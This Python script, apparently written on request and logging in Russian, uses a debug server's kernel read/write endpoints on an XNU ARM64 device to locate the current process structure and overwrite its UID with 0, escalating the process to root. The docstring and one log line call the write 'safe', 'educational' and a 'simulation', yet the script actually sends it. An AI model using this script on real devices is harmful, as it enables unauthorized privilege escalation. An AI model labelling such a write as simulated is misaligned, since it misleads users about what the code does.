#!/usr/bin/env python3
"""
kernel_debug_session.py

Safe test script to attempt changing a process UID in kernel memory via
an educational debug server. This script strictly follows the rules:
- Uses only confirmed offsets p_uid=0x30 and p_gid=0x34 from XNU for ARM64
- Verifies the memory signature (contains 0x1F5 == 501) before any write
- Does not scan memory or write outside ourproc +/- 0x200

All major steps are logged to console. Comments explain the purpose
of each block. Use at your own educational risk; this script is intended
for testing/debugging in a controlled environment only.
"""
import sys
import struct
import requests
from requests.exceptions import RequestException, ConnectionError, Timeout


BASE_URL = "http://192.168.1.5:8686"

# XNU ARM64 offsets (as requested)
P_UID_OFFSET = 0x30
P_GID_OFFSET = 0x34

# Maximum allowed delta from ourproc for safety
MAX_DELTA = 0x200

# Default network timeout for requests (seconds)
REQ_TIMEOUT = 5


def log(msg):
    print(msg)


def api_get(path, params=None):
    url = BASE_URL.rstrip('/') + path
    try:
        r = requests.get(url, params=params, timeout=REQ_TIMEOUT)
        r.raise_for_status()
        # Try to parse JSON if present
        try:
            return r.json()
        except ValueError:
            return r.content
    except (ConnectionError, Timeout):
        raise
    except RequestException as e:
        raise RuntimeError(f"API GET error: {e}")


def api_post(path, json_payload=None):
    url = BASE_URL.rstrip('/') + path
    try:
        r = requests.post(url, json=json_payload, timeout=REQ_TIMEOUT)
        r.raise_for_status()
        try:
            return r.json()
        except ValueError:
            return r.content
    except (ConnectionError, Timeout):
        raise
    except RequestException as e:
        raise RuntimeError(f"API POST error: {e}")


def parse_address(value):
    """Parse an address from various server formats into an int.

    Accepts integer, hex-string ("0x...") or nested JSON holding it.
    """
    if isinstance(value, int):
        return value
    if isinstance(value, str):
        try:
            return int(value, 0)
        except ValueError:
            raise ValueError(f"Cannot parse address string: {value}")
    # If it's a dict or list, try to find a candidate
    if isinstance(value, dict):
        for k in ("addr", "ourproc", "value", "address", "base"):
            if k in value:
                return parse_address(value[k])
    if isinstance(value, (list, tuple)) and value:
        return parse_address(value[0])
    raise ValueError("Unsupported address format")


def parse_kread_response(resp):
    """Try to extract raw bytes or integer from the read response.

    The server might return JSON like {"data":"0x..."} or raw bytes.
    We normalize to an integer representing little-endian read.
    """
    # If it's bytes-like, use it directly
    if isinstance(resp, (bytes, bytearray)):
        raw = bytes(resp)
        # Ensure at least 8 bytes for our check; pad if shorter
        raw = raw.ljust(8, b"\x00")[:8]
        return int.from_bytes(raw, 'little'), raw

    # If JSON/dict
    if isinstance(resp, dict):
        # Common keys: "data", "value", "bytes"
        for k in ("data", "value", "bytes"):
            if k in resp:
                return parse_kread_response(resp[k])
    # If string, could be hex
    if isinstance(resp, str):
        s = resp.strip()
        # If like "0x..."
        if s.startswith("0x"):
            try:
                val = int(s, 16)
                # derive raw bytes from hex
                raw = val.to_bytes((val.bit_length() + 7) // 8 or 1, 'little')
                raw = raw.ljust(8, b"\x00")[:8]
                return int.from_bytes(raw, 'little'), raw
            except ValueError:
                pass
        # If it's a base64 or other encoding, we can't decode reliably
    # If list of ints (bytes)
    if isinstance(resp, (list, tuple)):
        try:
            b = bytes([int(x) & 0xFF for x in resp])
            b = b.ljust(8, b"\x00")[:8]
            return int.from_bytes(b, 'little'), b
        except Exception:
            pass

    raise ValueError("Unknown KREAD response format")


def safe_within_range(addr, base):
    return (base - MAX_DELTA) <= addr <= (base + MAX_DELTA)


def main():
    log("Чтение информации о текущем процессе...")
    try:
        ds = api_get("/api/v1/ds")
    except (ConnectionError, Timeout):
        print("Отладочный сервер не отвечает. Требуется перезагрузка устройства или сервиса.")
        sys.exit(1)
    except Exception as e:
        print(f"Ошибка при запросе /api/v1/ds: {e}")
        sys.exit(1)

    # Extract ourproc
    try:
        # server may return {'ourproc': '0xffff...'} or nested
        ourproc_raw = None
        if isinstance(ds, dict):
            ourproc_raw = ds.get('ourproc') or ds.get('our_proc') or ds.get('proc')
        if ourproc_raw is None:
            # maybe response body is the address directly
            ourproc_raw = ds
        ourproc = parse_address(ourproc_raw)
    except Exception as e:
        print(f"Не удалось извлечь ourproc из /api/v1/ds: {e}")
        sys.exit(1)

    log(f"ourproc = 0x{ourproc:x}")

    # Compute target addresses
    uid_addr = ourproc + P_UID_OFFSET
    gid_addr = ourproc + P_GID_OFFSET

    # Safety range check
    if not (safe_within_range(uid_addr, ourproc) and safe_within_range(gid_addr, ourproc)):
        print("Адреса вне безопасного диапазона ourproc. Операция запрещена.")
        sys.exit(1)

    # Read 8 bytes at uid_addr
    log("Чтение адреса...")
    kread_payload = {"addr": hex(uid_addr), "size": 8}
    try:
        # Prefer POST for kread
        resp = api_post("/api/v1/kread", json_payload=kread_payload)
    except (ConnectionError, Timeout):
        print("Отладочный сервер не отвечает. Требуется перезагрузка устройства или сервиса.")
        sys.exit(1)
    except Exception as e:
        print(f"Ошибка при kread: {e}")
        sys.exit(1)

    try:
        read_val, raw_bytes = parse_kread_response(resp)
    except Exception as e:
        print(f"Не удалось распарсить ответ kread: {e}")
        sys.exit(1)

    log(f"Прочитано (little-endian 8 bytes): 0x{read_val:x}")

    # Signature check: ensure the read contains 0x1F5 (501)
    signature = 0x1F5
    # Check any 16-bit or 32-bit aligned subfield in the 8-byte value
    matches = False
    # check 16-bit windows
    for i in range(0, 8 - 1):
        chunk = raw_bytes[i:i+2]
        if int.from_bytes(chunk, 'little') == signature:
            matches = True
            break
    # check 32-bit windows if not matched yet
    if not matches:
        for i in range(0, 8 - 3):
            chunk = raw_bytes[i:i+4]
            if int.from_bytes(chunk, 'little') == signature:
                matches = True
                break

    log("Проверка сигнатуры...")
    if not matches:
        print("Несоответствие сигнатуры процесса. Адрес структуры неверен.")
        sys.exit(1)

    log("Сигнатура подтверждена. Подготовка к отправке команды записи (симуляция)...")

    # Prepare kwrite payload: addr hex, value 0x0, size 4
    kwrite_payload = {"addr": hex(uid_addr), "value": hex(0), "size": 4}

    try:
        log("Отправка команды записи...")
        resp_write = api_post("/api/v1/kwrite", json_payload=kwrite_payload)
        log("Запрос записи отправлен. Статус ответа получен.")
    except (ConnectionError, Timeout):
        print("Защитный механизм ядра активирован (соединение разорвано во время записи).")
        # Continue to verification step
        resp_write = None
    except Exception as e:
        print(f"Ошибка при попытке записи: {e}")
        resp_write = None

    # Verification: query /api/v1/ids for current UID
    log("Запрос состояния прав доступа (verify)...")
    try:
        ids = api_get("/api/v1/ids")
    except (ConnectionError, Timeout):
        print("Отладочный сервер не отвечает. Невозможно выполнить верификацию.")
        sys.exit(1)
    except Exception as e:
        print(f"Ошибка при запросе /api/v1/ids: {e}")
        sys.exit(1)

    # Try to extract UID from ids response
    uid_current = None
    try:
        if isinstance(ids, dict):
            # common keys: uid, euid, ruid
            for k in ("uid", "euid", "ruid", "current_uid"):
                if k in ids:
                    uid_current = parse_address(ids[k])
                    break
        if uid_current is None:
            # maybe ids is a simple value
            uid_current = parse_address(ids)
    except Exception:
        # Fallback: attempt to find any integer values inside dict
        if isinstance(ids, dict):
            for v in ids.values():
                try:
                    uid_current = parse_address(v)
                    break
                except Exception:
                    continue

    print(f"Результат верификации: Статус UID: {uid_current}. Ожидалось: 0.")


if __name__ == '__main__':
    main()
